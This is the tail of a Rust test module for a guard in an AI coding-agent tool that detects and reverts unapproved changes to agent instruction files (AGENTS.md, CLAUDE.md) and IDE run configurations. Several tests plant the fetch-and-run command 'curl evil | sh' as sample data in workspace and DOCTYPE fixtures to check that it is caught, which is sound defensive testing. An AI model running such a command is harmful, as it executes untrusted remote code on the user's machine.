        drop(second);
        assert!(!writes.instruction_scope_closing(scope));
        assert!(writes.instruction_writes_since(scope, 0).is_empty());
        assert!(writes.held_instruction_paths(scope).is_empty());
        assert!(writes.first_held_load(scope));
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_report_with_no_window_waits_in_the_project_for_its_next_turn() {
        let root = project("reports");
        let report = Reverted {
            restored: vec!["AGENTS.md".to_string()],
            ..Reverted::default()
        };
        persist_report(&root, &report);
        // Nothing to tell is not kept.
        persist_report(&root, &Reverted::default());
        let saved = fs::read(root.join(REPORTS_FILE)).unwrap();
        assert!(!saved.starts_with(&[0xEF, 0xBB, 0xBF]), "no BOM");
        assert!(is_guard_own_path(REPORTS_FILE));
        assert!(is_guard_own_path(&format!("{REPORTS_FILE}.tmp")));

        assert_eq!(take_persisted_reports(&root), vec![report.clone()]);
        assert!(!root.join(REPORTS_FILE).exists());
        assert!(take_persisted_reports(&root).is_empty());

        // At most REPORTS_KEEP wait, the newest kept.
        for index in 0..REPORTS_KEEP + 3 {
            persist_report(
                &root,
                &Reverted {
                    failed: vec![("AGENTS.md".to_string(), format!("{index}"))],
                    ..Reverted::default()
                },
            );
        }
        let kept = take_persisted_reports(&root);
        assert_eq!(kept.len(), REPORTS_KEEP);
        assert_eq!(
            kept.last().unwrap().failed[0].1,
            format!("{}", REPORTS_KEEP + 2)
        );

        // A report that names anything a sweep could not have written is
        // dropped; the others are kept.
        fs::write(
            root.join(REPORTS_FILE),
            r#"[{"restored":["../outside.md"]},{"restored":["src/main.eps"]},{"backup":"elsewhere"},{"watchedRisky":[[".idea/workspace.xml","src/x"]],"backup":".eud-agent/state/instruction-reverted/1-abcdef01"},{"restored":["CLAUDE.md"]}]"#,
        )
        .unwrap();
        let read = take_persisted_reports(&root);
        assert_eq!(read.len(), 1);
        assert_eq!(read[0].restored, vec!["CLAUDE.md"]);
        // A malformed file reads as nothing.
        fs::write(root.join(REPORTS_FILE), "not json").unwrap();
        assert!(take_persisted_reports(&root).is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn old_and_surplus_backup_folders_are_removed_and_nothing_else() {
        let root = project("prune");
        let backups = root.join(BACKUP_DIR);
        fs::create_dir_all(&backups).unwrap();
        let day = 24 * 60 * 60 * 1000;
        let now = 100 * day;
        let make = |n: u64| {
            let folder = backups.join(format!("{}-0000000{:x}", now - n * 1000, n % 16));
            fs::create_dir_all(&folder).unwrap();
            fs::write(folder.join("AGENTS.md"), "kept").unwrap();
        };
        // 19 recent folders and one 15 days old: within the count, but too
        // old to keep.
        for n in 5..24u64 {
            make(n);
        }
        let old = backups.join(format!("{}-abcdef01", now - 15 * day));
        fs::create_dir_all(&old).unwrap();
        prune_backups(&root, now, None);
        assert!(!old.exists());
        assert!(backups.join(format!("{}-00000005", now - 5000)).is_dir());
        // Five newer ones make 24: the oldest four go.
        for n in 0..5u64 {
            make(n);
        }
        // Anything not named like a sweep folder is never touched.
        fs::create_dir_all(backups.join("notes")).unwrap();
        fs::write(
            backups.join(format!("{}-deadbeef", now - 30 * day)),
            "a file",
        )
        .unwrap();
        let outside = std::env::temp_dir().join(format!(
            "eud-agent-instruction-guard-prune-outside-{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&outside).unwrap();
        fs::write(outside.join("keep.txt"), "keep").unwrap();
        let link = backups.join(format!("{}-0badf00d", now - 40 * day));
        #[cfg(windows)]
        let linked = std::os::windows::fs::symlink_dir(&outside, &link).is_ok()
            || std::process::Command::new("cmd")
                .args(["/C", "mklink", "/J"])
                .arg(&link)
                .arg(&outside)
                .output()
                .is_ok_and(|output| output.status.success());
        #[cfg(unix)]
        let linked = std::os::unix::fs::symlink(&outside, &link).is_ok();

        prune_backups(&root, now, None);

        let mut left: Vec<String> = fs::read_dir(&backups)
            .unwrap()
            .flatten()
            .filter_map(|entry| entry.file_name().to_str().map(str::to_string))
            .filter_map(|name| backup_folder_millis(&name).map(|millis| (millis, name)))
            .filter(|(_, name)| backups.join(name).is_dir())
            .filter(|(_, name)| {
                !fs::symlink_metadata(backups.join(name))
                    .unwrap()
                    .file_type()
                    .is_symlink()
            })
            .map(|(_, name)| name)
            .collect();
        left.sort();
        assert_eq!(left.len(), BACKUP_KEEP, "{left:?}");
        assert!(left.contains(&format!("{now}-00000000")));
        assert!(left.contains(&format!("{}-00000003", now - 19 * 1000)));
        assert!(!left.contains(&format!("{}-00000004", now - 20 * 1000)));
        assert!(!left.contains(&format!("{}-00000007", now - 23 * 1000)));
        assert!(backups.join("notes").is_dir());
        assert!(backups
            .join(format!("{}-deadbeef", now - 30 * day))
            .is_file());
        if linked {
            assert!(fs::symlink_metadata(&link).is_ok(), "a link is left alone");
            let _ = fs::remove_dir(&link).or_else(|_| fs::remove_file(&link));
        }
        assert_eq!(
            fs::read_to_string(outside.join("keep.txt")).unwrap(),
            "keep"
        );
        fs::remove_dir_all(root).ok();
        fs::remove_dir_all(outside).ok();
    }

    #[test]
    fn the_folder_just_made_stays_and_future_dated_ones_do_not_count() {
        let root = project("prune-skew");
        let backups = root.join(BACKUP_DIR);
        let hour = 60 * 60 * 1000;
        let now = 1000 * 24 * hour;
        let make = |millis: u64, id: &str| {
            let name = format!("{millis}-{id}");
            fs::create_dir_all(backups.join(&name)).unwrap();
            name
        };
        let recent: Vec<String> = (0..BACKUP_KEEP as u64)
            .map(|n| make(now - (n + 1) * 1000, &format!("0000000{:x}", n % 16)))
            .collect();
        // The clock went back an hour: dated after now, kept, not counted.
        let skewed = make(now + hour, "abcdef01");
        // Far ahead of any skew: removed.
        let bogus = make(now + 30 * 24 * hour, "abcdef02");
        // The sweep that prunes made this one; its time is off, but it holds
        // what that sweep just kept.
        let current = make(now - 20 * 24 * hour, "abcdef03");

        prune_backups(&root, now, Some(&current));

        assert!(backups.join(&current).is_dir());
        assert!(backups.join(&skewed).is_dir());
        assert!(!backups.join(&bogus).exists());
        // The folder just made counts among the newest: the oldest recent
        // one goes, every other one stays.
        assert!(!backups.join(recent.last().unwrap()).exists());
        for name in &recent[..BACKUP_KEEP - 1] {
            assert!(backups.join(name).is_dir(), "{name}");
        }
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_new_backup_prunes_the_folder() {
        let root = project("prune-on-sweep");
        let backups = root.join(BACKUP_DIR);
        let stale = backups.join("1000-abcdef01");
        fs::create_dir_all(&stale).unwrap();
        let baseline = Snapshot::capture(&root);
        fs::write(root.join("AGENTS.md"), "injected").unwrap();

        let reverted = sweep(&root, &baseline);

        assert!(reverted.backup.is_some());
        assert!(!stale.exists());
        assert!(root.join(reverted.backup.unwrap()).is_dir());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn held_paths_survive_a_restart_and_are_reported_again() {
        let root = project("held-restart");
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::remove_file(root.join("AGENTS.md")).unwrap();
        fs::create_dir(root.join("AGENTS.md")).unwrap();
        fs::write(root.join("AGENTS.md/inner.txt"), "x").unwrap();
        assert_eq!(
            guard_sweep(&mut guard, &root, &writes).excluded,
            vec!["AGENTS.md"]
        );
        drop(guard);
        let saved = fs::read(root.join(HELD_FILE)).unwrap();
        assert!(!saved.starts_with(&[0xEF, 0xBB, 0xBF]), "no BOM");
        assert!(std::str::from_utf8(&saved).unwrap().contains("AGENTS.md"));
        assert!(is_guard_own_path(HELD_FILE));

        // A new process: nothing in memory, the file holds it.
        let restarted = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let held = held_paths(&root, &restarted, "eps:project");
        assert_eq!(held, vec!["AGENTS.md"]);
        assert!(held_warning(&held).unwrap().contains("AGENTS.md"));

        // Once it changes it is released, and the file goes with it.
        fs::remove_dir_all(root.join("AGENTS.md")).unwrap();
        fs::write(root.join("AGENTS.md"), "fixed").unwrap();
        assert!(held_paths(&root, &restarted, "eps:project").is_empty());
        assert!(!root.join(HELD_FILE).exists());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn an_allowed_write_releases_a_held_path() {
        let root = project("held-approved");
        fs::create_dir_all(root.join(".idea")).unwrap();
        fs::write(root.join(".idea/workspace.xml"), "<a/>").unwrap();
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::write(root.join(".idea/workspace.xml"), "<b/>").unwrap();
        guard_sweep(&mut guard, &root, &writes);
        assert_eq!(
            held_paths(&root, &writes, "eps:project"),
            vec![".idea/workspace.xml"]
        );

        fs::write(root.join(".idea/workspace.xml"), "<c/>").unwrap();
        record_approved(
            &root,
            &writes,
            "eps:project",
            ".idea/workspace.xml",
            ApprovedContent::read(&root, ".idea/workspace.xml").unwrap(),
        );

        assert!(held_paths(&root, &writes, "eps:project").is_empty());
        assert!(guard_sweep(&mut guard, &root, &writes).report.is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_commit_holds_back_changed_instruction_files_nothing_settled() {
        if !crate::git::available() {
            eprintln!("skipping unsettled paths: git is not installed on this machine");
            return;
        }
        let root = project("unsettled");
        fs::write(root.join("CLAUDE.md"), "rules").unwrap();
        assert!(crate::git::prepare(&root).auto_commit_allowed());
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let guard = InstructionGuard::capture(&root, &writes, "eps:project");
        // Another session's shell rewrote AGENTS.md; this request wrote
        // CLAUDE.md with the card; an ordinary file changed too.
        fs::write(root.join("AGENTS.md"), "injected").unwrap();
        fs::write(root.join("CLAUDE.md"), "allowed").unwrap();
        writes.record_instruction_write(
            "eps:project",
            "CLAUDE.md",
            ApprovedContent::read(&root, "CLAUDE.md").unwrap(),
        );
        fs::write(root.join("src/main.eps"), "changed").unwrap();

        let held = unsettled_paths(&root, &writes, "eps:project", guard.since()).unwrap();
        assert_eq!(held, vec!["AGENTS.md"]);

        // An allowed write later overwritten without the card is held too.
        fs::write(root.join("CLAUDE.md"), "allowed, then injected").unwrap();
        let mut held = unsettled_paths(&root, &writes, "eps:project", guard.since()).unwrap();
        held.sort();
        assert_eq!(held, vec!["AGENTS.md", "CLAUDE.md"]);
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn an_excluded_folder_excludes_its_contents() {
        let excluded = std::collections::HashSet::from([crate::git::path_key("notes/CLAUDE.md")]);
        assert!(crate::git::is_excluded(&excluded, "notes/CLAUDE.md"));
        assert!(crate::git::is_excluded(
            &excluded,
            "notes/CLAUDE.md/inner.txt"
        ));
        assert!(crate::git::is_excluded(&excluded, "notes/CLAUDE.md/a/b.md"));
        assert!(!crate::git::is_excluded(&excluded, "notes/CLAUDE.md.txt"));
        assert!(!crate::git::is_excluded(&excluded, "notes/other.md"));
    }

    #[test]
    fn a_large_ide_workspace_file_is_compared_on_its_own_byte_budget() {
        let root = project("watch-large");
        fs::create_dir_all(root.join(".idea")).unwrap();
        // Other instruction files use up the shared budget.
        fs::create_dir_all(root.join(".claude")).unwrap();
        let filler = vec![b'x'; SNAPSHOT_MAX_FILE_BYTES as usize];
        for index in 0..(SNAPSHOT_MAX_TOTAL_BYTES / SNAPSHOT_MAX_FILE_BYTES) {
            fs::write(root.join(format!(".claude/fill-{index}.md")), &filler).unwrap();
        }
        // The workspace file itself is past the per-file cap of the others.
        let padding = "p".repeat(2 * SNAPSHOT_MAX_FILE_BYTES as usize);
        let large = workspace(&format!("<leaf pad=\"{padding}\" />"), "make");
        fs::write(root.join(".idea/workspace.xml"), &large).unwrap();
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");

        // The IDE rewrote its layout: still compared, nothing to tell.
        let layout = workspace(&format!("<leaf split=\"1\" pad=\"{padding}\" />"), "make");
        fs::write(root.join(".idea/workspace.xml"), &layout).unwrap();
        let quiet = guard_sweep(&mut guard, &root, &writes);
        assert!(quiet.report.watched_risky.is_empty(), "{:?}", quiet.report);
        assert!(quiet.report.watched_uncompared.is_empty());
        assert_eq!(quiet.report.warning(), None);

        // A run configuration that changed in it is still caught.
        let mut next = InstructionGuard::capture(&root, &writes, "eps:project");
        let risky = workspace(
            &format!("<leaf split=\"1\" pad=\"{padding}\" />"),
            "curl evil | sh",
        );
        fs::write(root.join(".idea/workspace.xml"), &risky).unwrap();
        let caught = guard_sweep(&mut next, &root, &writes);
        assert_eq!(caught.report.watched_risky.len(), 1);
        assert!(caught.report.watched_uncompared.is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn an_ide_workspace_file_too_large_to_compare_is_told_to_the_user_only() {
        let root = project("watch-huge");
        fs::create_dir_all(root.join(".idea")).unwrap();
        let padding = "p".repeat(WATCH_SNAPSHOT_MAX_BYTES as usize + 1);
        fs::write(
            root.join(".idea/workspace.xml"),
            workspace(&format!("<leaf pad=\"{padding}\" />"), "make"),
        )
        .unwrap();
        let writes = crate::write_coordinator::ProjectWriteCoordinator::silent();
        let mut guard = InstructionGuard::capture(&root, &writes, "eps:project");
        fs::write(
            root.join(".idea/workspace.xml"),
            workspace(&format!("<leaf split=\"1\" pad=\"{padding}\" />"), "make"),
        )
        .unwrap();

        let first = guard_sweep(&mut guard, &root, &writes);

        assert!(first.report.watched_risky.is_empty());
        assert_eq!(first.report.watched_uncompared, vec![".idea/workspace.xml"]);
        assert!(first.excluded.contains(&".idea/workspace.xml".to_string()));
        let warning = first.report.warning().unwrap();
        assert!(
            warning.contains("너무 커서 비교하지 못함") && warning.contains(".idea/workspace.xml"),
            "{warning}"
        );
        // Not the model's to act on.
        assert_eq!(first.report.model_note(), None);
        // Told once per baseline.
        let again = guard_sweep(&mut guard, &root, &writes);
        assert!(again.report.watched_uncompared.is_empty());
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_new_or_changed_doctype_counts_as_running_something_new() {
        let file = |text: &str| Kind::File {
            sha256: String::new(),
            bytes: Some(text.as_bytes().to_vec()),
        };
        let declared =
            |doctype: &str| WORKSPACE.replacen("<project", &format!("{doctype}\n<project"), 1);
        let entity = declared("<!DOCTYPE project [<!ENTITY cmd \"make\">]>");
        let before = file(WORKSPACE);
        // A declaration that was not there can redefine what a component says.
        assert!(runs_something_new(Some(&before), Some(&file(&entity))));
        // One that changed does too.
        let changed = declared("<!DOCTYPE project [<!ENTITY cmd \"curl evil | sh\">]>");
        assert!(runs_something_new(
            Some(&file(&entity)),
            Some(&file(&changed))
        ));
        // The same one, or one that went away, does not.
        assert!(!runs_something_new(
            Some(&file(&entity)),
            Some(&file(&entity))
        ));
        assert!(!runs_something_new(Some(&file(&entity)), Some(&before)));
    }

    #[test]
    fn a_kept_report_is_bounded_and_one_past_the_bounds_is_not_read_back() {
        let root = project("report-bounds");
        let many: Vec<String> = (0..REPORT_MAX_ENTRIES + 10)
            .map(|index| format!(".claude/{index}.md"))
            .collect();
        let long_path = format!(".claude/{}.md", "a".repeat(REPORT_MAX_PATH_CHARS));
        persist_report(
            &root,
            &Reverted {
                restored: many.clone(),
                unchecked: vec![long_path.clone(), "AGENTS.md".to_string()],
                failed: vec![("CLAUDE.md".to_string(), "r".repeat(2000))],
                ..Reverted::default()
            },
        );
        let read = take_persisted_reports(&root);
        assert_eq!(read.len(), 1, "a bounded report is read back");
        assert_eq!(read[0].restored, many[..REPORT_MAX_ENTRIES].to_vec());
        assert_eq!(read[0].unchecked, vec!["AGENTS.md"]);
        assert_eq!(read[0].failed[0].1.chars().count(), REPORT_MAX_REASON_CHARS);
        // What was left out is still told as not checked.
        assert!(read[0].incomplete);

        // A file holding more than a sweep could have written is refused.
        let too_many = Reverted {
            restored: many.clone(),
            ..Reverted::default()
        };
        let too_long = Reverted {
            unchecked: vec![long_path],
            ..Reverted::default()
        };
        let wordy = Reverted {
            failed: vec![(
                "CLAUDE.md".to_string(),
                "r".repeat(REPORT_MAX_REASON_CHARS + 1),
            )],
            ..Reverted::default()
        };
        let error = Reverted {
            error: Some("e".repeat(REPORT_MAX_REASON_CHARS + 1)),
            ..Reverted::default()
        };
        let fine = Reverted {
            restored: vec!["AGENTS.md".to_string()],
            ..Reverted::default()
        };
        fs::write(
            root.join(REPORTS_FILE),
            serde_json::to_vec(&vec![too_many, too_long, wordy, error, fine.clone()]).unwrap(),
        )
        .unwrap();
        assert_eq!(take_persisted_reports(&root), vec![fine]);
        fs::remove_dir_all(root).ok();
    }

    #[test]
    fn a_failed_sweep_is_kept_as_an_incomplete_report_with_its_error() {
        let root = project("report-error");
        let long = "x".repeat(4 * REPORT_MAX_REASON_CHARS);
        let report = Reverted::sweep_failed(&long);
        assert!(report.incomplete);
        assert_eq!(
            report.error.as_deref().map(|error| error.chars().count()),
            Some(REPORT_MAX_REASON_CHARS)
        );
        persist_report(&root, &Reverted::sweep_failed("잠금을 얻지 못했습니다"));
        let read = take_persisted_reports(&root);
        assert_eq!(read.len(), 1);
        let warning = read[0].warning().unwrap();
        assert!(
            warning.contains("지시 파일을 확인하지 못했습니다: 잠금을 얻지 못했습니다"),
            "{warning}"
        );
        assert!(warning.contains("끝까지 읽지 못해"), "{warning}");
        assert_eq!(read[0].model_note(), None);
        fs::remove_dir_all(root).ok();
    }
}
